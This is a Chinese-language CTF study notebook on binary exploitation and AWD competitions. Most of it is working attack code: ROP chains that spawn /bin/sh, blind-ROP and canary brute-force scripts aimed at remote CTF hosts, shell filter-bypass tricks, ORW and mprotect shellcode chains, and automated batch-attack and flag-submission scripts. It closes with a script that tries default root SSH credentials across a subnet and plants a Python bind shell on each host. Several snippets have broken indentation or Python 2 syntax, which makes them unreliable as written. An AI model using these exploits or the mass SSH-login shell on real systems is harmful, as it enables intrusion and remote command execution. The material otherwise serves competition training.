p += '//sh'
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049303) # xor eax, eax ; ret

p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de955) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049303) # xor eax, eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0806cc25) # int 0x80
io.sendline(p)


```

##### 变种ROP：

开启了地址随机化，我们得到的地址都并不是真实地址，而是一个相对偏移：

做法其实跟之前一样，不同的仅仅是需要在前面加上libc_base 也就是先算出libc中的基址

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io.recvuntil("Maybe it's simple,O.o\n")
system = int(io.recvline(),16)
print hex(system)
libc_base = system - libc.sym['system']
bin_sh = libc_base + next(libc.search('/bin/sh'))
pop_rdi = libc_base + 0x2164f  # 0x000000000002164f : pop rdi ; ret 
ret = libc_base + 0x8aa        # 0x00000000000008aa : ret
payload = cyclic(136) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)

```



##### one_gadget:

one_gadget是libc中存在的一些执行execve("/bin/sh", NULL, NULL)的片段

```shell
#安装
sudo apt -y install ruby
sudo gem install one_gadget

#使用
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

```python
#exp案例
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#获得libc
one_gadget = 0x10a2fc
printf_libc = libc.symbols['printf']
io.recvuntil('this:')
printf = int(io.recv(14),16)
libc_base = printf-printf_libc
#libc+one_gadget调用execve(bin/sh;null;null)
io.sendline(str(one_gadget+libc_base))

```

##### 盲打（BROP）

BROP全称为"BlindROP"，一般在我们无法获得二进制文件的情况下利用 ROP进行远程攻击某个应用程
序，劫持该应用程序的控制流，我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用
程序可以被现有的一些保护机制，诸如NX, ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务
器可以是32位系统或者64位系统，BROP这一概念在2014年由Standford的Andrea Bittau发表在
Oakland 2014的论文Hacking Blind中提出。

要利用BROP，有两个先决条件：
1. 程序必须存在一个已知漏洞（一般是栈溢出漏洞或者格式化字符串漏洞），并且攻击者知道如何触
发该漏洞；
2. 应用程序在crash之后可以重新启动，并且重新启动的进程不会被re-rand(虽然有ASLR的保护，但
是复活的进程和之前的进程的地址随机化是一样的)，这个需求其实在现实中是存在且合理的，诸如
像如今的nginx, MySQL, Apache, OpenSSH, Samba等应用均符合此类特性。

BROP的攻击思路一般有以下几个步骤：
1. 暴力枚举，获取栈溢出长度，如果程序开启了Canary ，顺便将canary也可以爆出来
2. 寻找可以返回到程序main函数的gadget,通常被称为stop_gadget
3. 利用stop_gadget寻找可利用(potentially useful)gadgets，如:pop rdi; ret
4. 寻找BROP Gadget，可能需要诸如write、put等函数的系统调用
5. 寻找相应的PLT地址
6. dump远程内存空间
7. 拿到相应的GOT内容后，泄露出libc的内存信息，最后利用rop完成getshell

ezBROP：接收数字进行计算的

```python
from pwn import *
import time
p=remote("1.95.36.136", 2092)

p.sendline("haha")
p.sendline("2")
p.sendline("22")

for i in range(520):
        p.recvuntil('看看这道题怎么样：')
        temp = p.recvuntil(b'=')
        temp=temp.decode().replace("="," ")
        ans = eval(temp)
        p.sendline(str(ans))
        p.sendline(' ')
        print(temp,ans,i)
        time.sleep(1)
p.interactive()
```

blind rop：

```python
from pwn import *
from LibcSearcher import *
io = remote('pwn.challenge.ctf.show',28153)
buf_length   = 72
stop_gadgets = 0x400728
brop_gadgets = 0x4007ba
pop_rdi_ret  = 0x400843
puts_plt     = 0x400550
puts_got     = 0x602018
#暴力枚举栈空间大小
def Getbuflenth():
    i = 1
    while 1:
        try:
            io = remote('pwn.challenge.ctf.show',28235)
        	io.recvuntil("Welcome to CTFshow-PWN ! Do you know who is daniu?\n")
            io.send(i*'a')
            data = io.recv()
            io.close()
            if not data.startswith('No passwd'):
                return i-1
            else:
                i+=1
        except EOFError:
            io.close()
            return i-1
#找到获取stop_gadget     
def GetStopAddr():
	address = 0x400000
	while 1:
		print(hex(address))
		try:
			io = remote('pwn.challenge.ctf.show',28235)
			io.recvuntil('Do you know who is daniu?\n')	
            payload='a'*buf_length+p64(address)
 			io.send(payload)
 			output = io.recv()
 			if not output.startswith('Welcome to CTFshow-PWN ! Do you know who is daniu?'):
 				io.close()
 				address += 1
 			else:
 				return address
 		except EOFError:
 			address += 1
 			io.close()
#寻找useful gadge    
def GetgadgetsAddr(buf_length, stop_addr):
    addr = stop_addr
    while True:
        sleep(0.1)
        addr += 1
        payload  = "A" * buf_length
        payload += p64(addr)
        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
        payload += p64(stop_addr)
        try:
            io = remote('pwn.challenge.ctf.show',28235)
            io.recvline()
            io.sendline(payload)
            io.recvline()
            io.close()
            log.info("find address: 0x%x" % addr)
            try:    # check
                payload  = "A"* buf_size
                payload += p64(addr)
                payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
                io = remote('pwn.challenge.ctf.show',28235)
                io.recvline()
                io.sendline(payload)
                io.recvline()
                io.close()
                log.info("bad address: 0x%x" % addr)
            except:
                io.close()
                log.info("gadget address: 0x%x" % addr)
                return addr
        except EOFError as e:
            io.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1           
#获取puts_plt的地址            
def Getputs_plt(buf_length, stop_addr, gadgets_addr):
    pop_rdi = gadgets_addr + 9      # pop rdi; ret;
    addr = stop_addr
                          
while True:
        sleep(0.1)
        addr += 1
        payload  = "A"*buf_length
        payload += p64(pop_rdi)
        payload += p64(0x400000)
        payload += p64(addr)
        payload += p64(stop_addr)
        try:
            io = remote('pwn.challenge.ctf.show',28235)
            io.recvline()
            io.sendline(payload)
            if io.recv().startswith("\x7fELF"):
                log.info("puts@plt address: 0x%x" % addr)
                io.close()
                return addr
            log.info("bad: 0x%x" % addr)
            io.close()
        except EOFError as e:
            io.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1          

def Dump_Memory(buf_length, stop_addr,gadgets_addr, puts_plt, start_addr,end_addr):
    pop_rdi  = gadgets_addr + 9     # pop rdi; ret
    result = ""
    while start_addr < end_addr:
        #print result.encode('hex')
        sleep(0.1)
        payload  = "A"*buf_length
        payload += p64(pop_rdi)
        payload += p64(start_addr)
        payload += p64(puts_plt)
        payload += p64(stop_addr)
        try:
            io = remote('pwn.challenge.ctf.show',28235)
            io.recvline()
            io.sendline(payload)
            data = io.recv(timeout=0.1)      # timeout makes sure to recive all bytes
            if data == "\n":
                data = "\x00"
            elif data[-1] == "\n":
                data = data[:-1]
            log.info("leaking: 0x%x --> %s" % (start_addr,(data or '').encode('hex')))
            result += data
            start_addr += len(data)
            io.close()
        except:
            log.info("Can't connect")
    return result
                          
io.recvuntil('Do you know who is daniu?\n')
payload  = 'a' * buf_length
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload += p64(stop_gadgets)
io.sendline(payload)
puts = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print hex(puts)
libc = LibcSearcher('puts',puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload  = 'a' * buf_length + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.sendline(payload)
io.interactive()
                          
```



##### 栈迁移

先去看汇编基础

 如图这是我们栈迁移的原理图![img](https://img2020.cnblogs.com/blog/2547408/202109/2547408-20210916190235308-2007478208.png) 

栈迁移能被实施的条件有二：

1. 存在 **leave ret** 这类gadget指令
2. 存在可执行shellcode的内存区域

要完成栈迁移的攻击结构，就要覆盖原栈上 **ret**为 **leave** **ret** gadget的地址 

```python
#例子
elf = ELF('./pwn')
system = elf.plt['system']
leave = 0x08048766
payload = 'a' * 0x24 + 'show'
io.recvuntil('codename:')
io.send(payload)
io.recvuntil('show')
ebp = u32(io.recv(4).ljust(4,'\x00'))
#gdb.attach(io)
print 'ebp='+hex(ebp) 
buf = ebp - 0x38 
payload = (p32(system) + 'aaaa' + p32(buf + 12) + '/bin/sh\x00').ljust(0x28,'a') + p32(buf-4) + p32(leave)
io.send(payload) 
```

 ![img](https://img2020.cnblogs.com/blog/2547408/202109/2547408-20210916192136789-1878432503.png) 

### 保护绕过

#### canary：

canary爆破脚本：

```python
#32位
canary = ''

for i in range(4):
   for c in range(0xFF):
      #io = process('./pwn')

      io = remote('pwn.challenge.ctf.show',28173)
      io.sendlineafter('>','-1')
      payload = 'a'*0x20 + canary + p8(c)
      io.sendafter('$ ',payload)
      io.recv(1)
      ans = io.recv()
      print ans

      if 'Canary Value Incorrect!' not in ans:
         print 'The index({}),value({})'.format(i,c)
         canary += p8(c)
         break

      else:
          print 'tring... ...'

      io.close()

print 'canary=',canary
```

### 沙箱绕过：

#### bin/sh等价

```shell
$0
sh
bin/sh

```

#### cat等价

```shell
tail / head / tac / nl / grep / more / less flag
cat flag
ls 
```

#### 拼接绕过

```shell
a=c;b=at;c=f;d=lag.txt;
$a$b ${c}${d}
```

#### 反斜杠绕过

```shell
c/at fl/ag.txt
```

#### 空格代替

```shell
<
${IFS}
$IFS$9
%09
```

#### 编码绕过

```python
`echo 'Y2F0Cg==' | base64 -d`  flag.txt
```

#### ORW：

 CTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell ，这个时候就需要用open，read，write这样的函数打开flag

可以通过 seccomp-tools dump ./pwn 来查看文件的沙箱保护。

```python
#orw的例子：
mmap = 0x123000
jmp_rsp = 0x400a01
orw_shellcode  = shellcraft.open("/ctfshow_flag")
orw_shellcode += shellcraft.read(3,mmap,100)
orw_shellcode += shellcraft.write(1,mmap,100)
shellcode = asm(orw_shellcode)	#编写shellcode

payload  = asm(shellcraft.read(0,mmap,0x100))+asm("mov rax,0x123000; jmp rax")
payload  = payload.ljust(0x28,'a')
payload += p64(jmp_rsp)+asm("sub rsp,0x30; jmp rsp")#编写跳转指令

io.sendline(payload)
io.sendline(shellcode)


#用汇编编写shellcode执行orw
shellcode = 
'''
//调用open()
push 0
//绕过strlen()检查
mov r15, 0x67616c66
push r15
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall
//调用read()
mov r14, 3
mov rdi, r14
mov rsi, rsp
mov rdx, 0xff
mov rax, 0
syscall
//调用write()
mov rdi,1
mov rsi, rsp
mov rdx, 0xff
mov rax, 1
syscall
'''
payload = asm(shellcode)

```



### 链接：

#### 静态动态链接 

##### 1.静态--mprotect

**函数原型：int mprotect(void *addr, size_t len, int prot);**

![1733396345146](C:\Users\16082\AppData\Roaming\Typora\typora-user-images\1733396345146.png)

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：  

1）PROT_READ：表示内存段内的内容可写； 　 

2）PROT_WRITE：表示内存段内的内容可读； 　 

3）PROT_EXEC：表示内存段中的内容可执行； 　 

4）PROT_NONE：表示内存段中的内容根本没法访问。 　 

5） prot=7 是可读可写可执行 

**read函数原型: ssize_t read(int fd, void *buf, size_t count); **

1）fd 设为0时就可以从输入端读取内容 设为0  

2）buf 设为我们想要执行的内存地址 设为我们已找到的内存地址0x80EB000  

3）size 适当大小就可以 只要够读入shellcode就可以，设置大点无所谓 可以看到read函数也有三个参数要设置，我们就可以继续借用上面找到的有3个寄存器的ret指令

**利用这个函数把段的属性改成可读可写可执行，进而执行shellcode **  

```python
#32位的mprotect利用
#获取信息，填写攻击信息
elf = ELF('./pwn')
mprotect = elf.sym['mprotect']
read_addr = elf.sym['read']
pop_ebx_esi_ebp_ret = 0x80a019b  #0x080a019b : pop ebx ; pop esi ; pop ebp ; 
ret	#为了调用三个参数的函数
M_addr = 0x80DA000	#bss地址
M_size = 0x1000	#空间大小
M_proc = 0x7	#改变的属性

payload = cyclic(0x12+4) + p32(mprotect) #进入mprotect
payload += p32(pop_ebx_esi_ebp_ret) + p32(M_addr) + p32(M_size) + 
p32(M_proc)	#填写函数参数
payload += p32(read_addr)	#进入read函数
payload += p32(pop_ebx_esi_ebp_ret) + p32(0) + p32(M_addr) + p32(M_size) + 
p32(M_addr)	#再次填写函数的参数

#发送攻击
io.sendline(payload)
shellcode = asm(shellcraft.sh())
io.sendline(shellcode)


#64位
#step2 : mprotect_bss_to_rwx
#能ret2libc就用，比这个快
#主要区别还是函数的传参规则不一样
payload = cyclic(40)
payload+= p64(pop_rdi_ret)
payload+= p64(bss_start_addr)
payload+= p64(pop_rsi_ret)
payload+= p64(0x1000)
payload+= p64(pop_rdx_ret)
payload+= p64(0x7)
payload+= p64(libc.sym['mprotect'])
payload+= p64(main)
#gdb.attach(io)
io.sendline(payload)

#step3 : gets_shellcode_to_bss
#非常好用的一小步
payload = cyclic(40)
payload+= p64(pop_rdi_ret)
payload+= p64(shellcode_addr)
payload+= p64(libc.sym['gets'])
payload+= p64(main)

io.sendline(payload)
io.sendline(asm(shellcraft.sh()))
```

#### 动态链接



## 四，linux系统

### 远程链接：

**nc 域名(ip) 端口：**

1. 网络连接工具，常用于端口监听、数据传输等 ，无加密，数据传输为明文 

2. 调试、端口扫描、简单数据传输等 

**ssh username@hostname：** 

1. 安全的远程登录和执行命令， 提供加密，保证数据传输安全 

2. 远程管理、执行命令、文件传输、端口转发等  

### 终端命令：

**1.执行命令：**

- 在Linux命令中，分号（ ; ）用于分隔多个命令，允许在一行上顺序执行多个命令。 
- 可以使用 & 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。
- 在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。 所以cat /ctf*能够读到flag
- exec 函数来执行 sh 命令:   "exec cat /ctf* 1>&0"   (其中1>&0是输出重定向)

2.读写命令：**

- \>\>符号表示以追 加的方式写入文件，如果文件不存在则创建新文件。echo 'flag is here'>>/ctfshow_flag
- \> 符号表示以覆盖 的方式写入文件，如果文件不存在则创建新文件。

**3.权限命令：**

- su 用户名：切换用户
- sudo -i：进入root权限状态

## 五，AWD

### 赛前预备

#### 扫描ip：

init_hosts.py：

```python
import requests
import threading

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

def check_ip(i):
    try:
        url = f'http://192-168-1-{i}.awd.bugku.cn/' #*
        response = requests.get(url, timeout=0.5)
        if response.status_code == 200:
            li('[+] ' + url)
            with open('hosts', 'a+') as f:
                f.write(f'192-168-1-{i}.awd.bugku.cn:9999\n') #*
        else:
            raise Exception("Not 200 OK")
    except Exception as e:
        ll('[-] ' + url)
        with open('h', 'a+') as f:
            f.write(f'192-168-1-{i}.awd.bugku.cn:9999\n') #*

NUM_THREADS = 256

threads = []
for i in range(1, 256):
    thread = threading.Thread(target=check_ip, args=(i,))
    threads.append(thread)
    thread.start()

    if len(threads) >= NUM_THREADS:
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.join()
```

#### 防御：

##### 工具：

1.IDA

2.加沙箱：https://starrysky1004.github.io/2024/04/26/awd-pwn/awd-pwn/#/

3.加patch：https://github.com/aftern00n/AwdPwnPatcher#/

##### 使用：

1.加沙箱通防：

​	sandboxs改禁用规则

​	python3 evil_patcher.py file_name sandboxfile

2.ida的patch步骤：edit -> patch program -> apply patches to input file

3.awdpwnpatcher使用：

`from AwdPwnPatcher import *binary = "filename"awd_pwn_patcher = AwdPwnPatcher(binary)`

`add_patch_in_ehframe(assembly="", machine_code=[])`

`patch_origin(start, end=0, assembly="", machine_code=[], string="")`

`patch_by_jmp(self, jmp_from, jmp_to=0, assembly="", machine_code=[])`

`patch_by_call(self, call_from, assembly="", machine_code=[])`

`add_constant_in_ehframe(self, string)`

`save(self, save_path="")`

4.格式化字符串：

32位：

```python
from AwdPwnPatcher import *
binary = "filename"
awd_pwn_patcher = AwdPwnPatcher(binary)

awd_pwn_patcher.patch_fmt_by_call(address)  #call printf地址
awd_pwn_patcher.save()
```

64位：

```python
from AwdPwnPatcher import *
binary = "filename"
awd_pwn_patcher = AwdPwnPatcher(binary)

fmt_offset = awd_pwn_patcher.add_constant_in_ehframe("%s\\x00\\x00")  #添加%s

assembly = """
mov rsi, qword ptr [rbp-0x8]
lea rdi, qword ptr [{}]
""".format(hex(fmt_offset))

awd_pwn_patcher.patch_by_jmp(0x706, jmp_to=0x712, assembly=assembly)    #改printf，mov rax地址和call printf地址
awd_pwn_patcher.save()
```

栈溢出：

```python
from AwdPwnPatcher import *
binary = "filename"
awd_pwn_patcher = AwdPwnPatcher(binary)

assembly = '''
push 0x20   #缩小输入范围，控制寄存器push进去的值
'''

awd_pwn_patcher.patch_origin(0x8048476, end=0x804847b, assembly=assembly)   #原push地址和push的下一条地址
awd_pwn_patcher.save()
```

uaf：

32位：

```python
from AwdPwnPatcher import *
binary = "./filename"
awd_pwn_patcher = AwdPwnPatcher(binary)

assembly = """
add esp, 0x10
mov eax, 0
mov edx, dword ptr [ebp - 0x20]
mov eax, 0x804a060  #被释放的地址
lea eax, dword ptr [eax + edx*4]
mov dword ptr [eax], 0
"""

awd_pwn_patcher.patch_by_jmp(0x80485bf, jmp_to=0x80485c7, assembly=assembly)    #call free地址和下一条地址
awd_pwn_patcher.save()
```

64位：

```python
from AwdPwnPatcher import *
binary = "./filename"
awd_pwn_patcher = AwdPwnPatcher(binary)

assembly = """
mov eax, 0
mov eax, dword ptr [rbp - 0x1c]
cdqe
lea rdx, qword ptr [0x201040]
lea rax, qword ptr [rdx + rax*8]
mov qword ptr [rax], 0
"""

awd_pwn_patcher.patch_by_jmp(0x838, jmp_to=0x83d, assembly=assembly)
awd_pwn_patcher.save()
```

gets溢出：

```assembly
.eh_frame:0000000000400F7D mov     rax, 0          ;#define __NR_read 0
.eh_frame:0000000000400F84 mov     rdi, 0          ; fd
.eh_frame:0000000000400F8B lea     rsi, [rbp+buf]  ; buf
.eh_frame:0000000000400F8E mov     rdx, 90h        ; count
.eh_frame:0000000000400F95 syscall
.eh_frame:0000000000400F97 jmp     loc_400AB4
```

负数绕过：

将jle改成jbe

```assembly
cmp     eax, 20h
jle     short loc_8048777
```

#### 攻击

exp.py：

```python
#!/usr/bin/env python3
# A script for awd exp

import os
import sys
from time import sleep
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './pwn'

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')


def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()

ip = server_ip = sys.argv[1].split(':')[0]
port = int(sys.argv[1].split(':')[1])
r = remote(ip, port)

......	#exp

r.sendline(b'cat flag')
r.recvuntil(b'{')
flag = b'viol1t{' + r.recvuntil(b'}')
write_to_flags(flag)

r.interactive()
```

submit_flag.py:

```python
#!/usr/bin/env python3
# A script for awd loop submit flag
import threading
from time import sleep
import os
import json
import requests

flag_file = './flags'
threads = []

def submit(flag):
    try:
        # url = 'https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&flag=' + flag[:-1]
        url = f"curl -X POST http://27.25.152.77:19999/api/flag -H 'Authorization: 7f120ca9b0e3024d06734a04a986cc55' -d '{{ \"flag\": \"{flag[:-1]}\"}}'"
        print(url)
        # r = requests.get(url)
        os.system(url)
        print('\x1b[01;38;5;214m[+] pwned!\x1b[0m')
    except Exception as e:
        print('\x1b[01;38;5;214m[-] connect fail: {}\x1b[0m'.format(str(e)))

def main():
    with open(flag_file) as flag_txt:
        flags = flag_txt.readlines()
        for flag in flags:
            thread = threading.Thread(target=submit, args=(flag,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
```

attack.sh:

```bash
#! /bin/bash

attack_times=10000
round_wait_time=30 #half time
wait_submit_time=5
log_file="logs"
run_time=120 #timeout
next_attack_time=2.5 
max_concurrent_attacks=10 # Max number of concurrent attacks

log(){
    t=$(date "+%H:%M:%S")
    m="[$t]$1" # Fixed missing parameter usage
    info="\033[43;37m $m \033[0m"
    echo -e "$info"
    echo -e "$m" >> $log_file
}

attack() {
    echo "-- round $1 -- " >> all_flags
    cat flags >> all_flags
    rm flags
    local jobs=0
    for line in $(cat hosts); do
        timeout --foreground $run_time python3 ./exp.py "$line" &
        sleep $next_attack_time
        ((jobs++))
        if [ "$jobs" -ge "$max_concurrent_attacks" ]; then
            wait # Wait for all background jobs to finish
            jobs=0
        fi
    done
    wait # Ensure all attacks are complete before moving on
    echo -e "\x1b[47;30m Waiting $wait_submit_time s to submit flag\x1b[0m"
    sleep $wait_submit_time
    echo -e "\x1b[47;30m Submitting flag\x1b[0m"
    python3 ./submit_flag.py
}

for ((i=1; i <= attack_times; i++)); do
    m="-------- round $i --------"
    log "$m"
    attack $i
    echo -e "\x1b[47;30m Waiting next round\x1b[0m"
    sleep $round_wait_time
done
```

#### 流量监控

pwn_waf:

https://github.com/i0gan/pwn_waf/tree/main

 创建一个文件夹并赋一定权限，改`makefile`中的`log path`为该文件夹地址，`make`后将`pwn`和`catch`放到创建的文件夹中，再用`catch`替换`pwn`文件，此时`exp`打用`catch`替换的`pwn`文件即可在创建的文件夹中接收到流量 

### 脚本



### 总结流程

改`init_hosts.py`中的`ip`格式和`port`

改`submit_flag.py`中的提交方式和`token`

改`round_wait_time`

`patch`

写`exp`

批量攻击

## 六，出题

### C语言编写

#### elf文件：

##### 关闭保护：

```shell
#1关闭RELRO
gcc -o pwn1 pwn1.c -no-pie -Wl,-z,norelro
#2关闭canary
#使用 -fno-stack-protector 禁用栈保护 
gcc -o pwn1 pwn1.c -no-pie -fno-stack-protector
#3关闭NX（No eXecute）保护禁止数据段的执行
#使用 -z execstack 选项
gcc -o pwn1 pwn1.c -no-pie -z execstack
#4关闭 PIE
#使用 -no-pie 选项
gcc -o pwn1 pwn1.c -no-pie
#5关闭 Shadow Stack (SHSTK) 和 Indirect Branch Tracking (IBT)
gcc -o pwn1 pwn1.c -fcf-protection=none
# 保留符号表
gcc -o pwn1 pwn1.c -no-pie -g
```

## 常用套题脚本

### linux

#### ret2**

```python
#checksec pwn1
from pwn import *
from LibcSearcher import LibcSearcher
import time
#初始寻找
#context.log_level = 'debug'
e=ELF("")
#io=process("")
io=remote("",)
#libc=ELF("")

#常见使用got和plt
write_got = e.got['write']
write_plt = e.plt['write']
read_got = e.got['read']
read_plt = e.plt['read']
main_addr = e.symbols['main']
bss_base = e.bss()

#常用数据使用
#ROPgadget --binary pwn1 | grep "ret"
ret_addr = 			
#ROPgadget --binary pwn1 | grep "pop rdi"
pop_rdi_addr = 			
#ROPgadget --binary pwn1 | grep "pop"
pop_rda_rba_rca_addr = 

#利用点
offer = 
backdoor = 

io.sendline()
#io.sendline()
#io.sendline()
io.interactive()

```



## ps

### ps1：关于pwn环境的一些提示：

1.要使用linux环境下的虚拟机：

​	1.vm下载Ubuntu或者kali
​	2.wsl下载ubuntu或则kali

​	在wsl中，我们可以使用vscode的工具来远程控制我们的虚拟机，但是由于环境问题，为了避免污染，我们一般用python工具在开辟一个虚拟环境，在ubuntu上，在上面下载：pwntools，libcsearch，gdb，等pwn题使用的工具，创建虚拟环境流程：

```
python3 -m venv 环境名称（pwn）
source pwn/bin/activate   #这个是开启环境的语句
deactivate  #这个是退出当前环境
###
pip install pwntools（下载pwntools）
pip install LibcSearch
pip list （列出下载文件）
pip show name（检查文件是否下载）   

```



### ps2:关于pwn题的解题步骤的一些工具用法：

#### 1.checksec：

​		作用：检查文件的保护，查看它的状态。
​		使用方法：checksec [-h] [--file [elf ...]] [elf ...]，例如：checksec /path/to/file

#### 2.ROPgadget：

​		作用：寻找文件中关键gadget的地址，用于构建rop。
​		使用方法：ROPgadget --binary /path/to/file 例如：ROPgadget --binary vulnerable_binary --search "pop rdi; ret"

​		具体方法： 1.--binary <binary>    指定要分析的二进制文件的路径 
​		2.--string <string>     在可读段中搜索给定的字符串 
​		3.--only <key>   仅显示特定类型的指令。例如，你可以指定 `pop`、`ret` 等关键字 
​		4. --ropchain   启用 ROP 链生成。这会自动将找到的 gadgets 连接成一个可执行的 ROP 链，适用于攻击开发。 例如：ROPgadget --binary vulnerable_binary --ropchain

​						

# web

## 基础知识：



## 十大漏洞：

### SQL注入：



## AWD

### 脚本：

#### 1.默认SSH密码批量反弹shell

官方在给出服务器密码时，很有可能是默认的，需要赶快修改自己的密码并尝试能不能登陆别人的靶机 

```python
#-*- coding:utf-8 -*-
import paramiko

ip = '192.168.1.137'
port = '22'
username = 'root'
passwd = 'toor'
# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd='ls'):
    port = int(port)
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect(hostname=ip, port=port, username=username, password=passwd)

    stdin,stdout,stderr = ssh.exec_command(cmd)

    result = stdout.read()
    if not result :
        print("无结果!")
        result = stderr.read()
    ssh.close()
    
    return result.decode()
    
a = ssh_base_pwd(ip,port,username,passwd)
print(a)
```

执行命令可以是写webshell或着直接查看flag 并返回提交

这里献上自己写的批量ssh登录并反弹python shell

```python
#-*- coding:utf-8 -*-
import paramiko
import threading
import queue
import time
#反弹shell python

q=queue.Queue()
#lock = threading.Lock()

# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    ssh.connect(hostname=ip, port=port, username=username, password=passwd)

    stdin,stdout,stderr = ssh.exec_command(cmd)

    result = stdout.read()
    if not result :
        result = stderr.read()
    ssh.close()
    
    return result.decode()

def main(x):
    shell = '''
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)

    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith('cd'):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b'OK!')
    '''
    cmd = 'echo \"%s\" > ./shell.py' % (shell) +'&& python3 ./shell.py'
    port = '22'
    username = 'root'
    passwd = 'toor'
    
    ip = '192.168.1.{}'.format(x)
    q.put(ip.strip(),block=True, timeout=None)
    ip_demo=q.get()
    #判断是否成功
    try:
        #lock.acquire()
        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id')
        if res:
            print("[ + ]Ip: %s" % ip_demo +" is success!!! [ + ]")
            #lock.release()
            ssh_base_pwd(ip_demo,port,username,passwd,cmd)
    except:
        print("[ - ]Ip: %s" % ip_demo +" is Failed")
    if x > 255:
        print("Finshed!!!!!!!!")
    q.task_done()
    
#线程队列部分
th=[]
th_num=255
for x in range(th_num):
        t=threading.Thread(target=main,args=(x,))
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()
        

#q.join()所有任务完成  
```

#### dump源码



